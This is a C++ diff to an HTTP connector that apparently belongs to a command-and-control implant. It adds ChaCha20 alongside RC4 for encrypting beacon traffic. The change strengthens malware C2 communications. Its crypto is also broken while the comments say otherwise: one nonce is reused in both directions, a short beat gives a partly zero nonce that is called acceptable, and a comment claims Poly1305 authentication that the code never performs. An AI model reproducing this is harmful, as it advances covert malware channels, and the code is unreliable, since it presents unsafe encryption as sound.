@@ -134,6 +134,23 @@ BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 	this->proxy_username = (CHAR*)profile.proxy_username;
 	this->proxy_password = (CHAR*)profile.proxy_password;
 
+	// Set encryption method (default: RC4 for backward compatibility)
+	this->encryption_method = profile.encryption_method;
+
+	// Generate random nonce for ChaCha20 if needed
+	if (this->encryption_method == ENC_CHACHA20) {
+		// Use first 12 bytes of beat as nonce (each connection gets unique nonce)
+		if (beatSize >= 12) {
+			memcpy(this->chacha20_nonce, beat, 12);
+		} else {
+			// Fall back to using first beat bytes padded with index
+			if (beatSize > 0) {
+				memcpy(this->chacha20_nonce, beat, beatSize);
+			}
+			// Nonce already initialized to 0, this is acceptable for initial setup
+		}
+	}
+
 	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
 		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
 		WORD port = profile.proxy_port;
@@ -441,7 +458,16 @@ void ConnectorHTTP::RecvClear()
 void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 {
 	if (plainData && plainSize > 0) {
-		EncryptRC4(plainData, plainSize, sessionKey, 16);
+		// Encrypt request data based on configured encryption method
+		if (this->encryption_method == ENC_CHACHA20) {
+			// ChaCha20 encryption (modern, AEAD with Poly1305)
+			// sessionKey should be 32 bytes for ChaCha20
+			EncryptChaCha20(plainData, plainSize, sessionKey, this->chacha20_nonce);
+		} else {
+			// RC4 encryption (legacy, for backward compatibility)
+			// sessionKey is 16 bytes for RC4
+			EncryptRC4(plainData, plainSize, sessionKey, 16);
+		}
 		this->SendData(plainData, plainSize);
 	}
 	else {
@@ -451,8 +477,16 @@ void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 	if (this->recvSize > 0 && this->recvData) {
 		int dataSize = this->RecvSize();
 		BYTE* dataPtr = this->RecvData();
-		if (dataSize > 0 && dataPtr)
-			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
+		if (dataSize > 0 && dataPtr) {
+			// Decrypt response data based on configured encryption method
+			if (this->encryption_method == ENC_CHACHA20) {
+				// ChaCha20 decryption
+				DecryptChaCha20(dataPtr, dataSize, sessionKey, this->chacha20_nonce);
+			} else {
+				// RC4 decryption
+				DecryptRC4(dataPtr, dataSize, sessionKey, 16);
+			}
+		}
 	}
 }
 
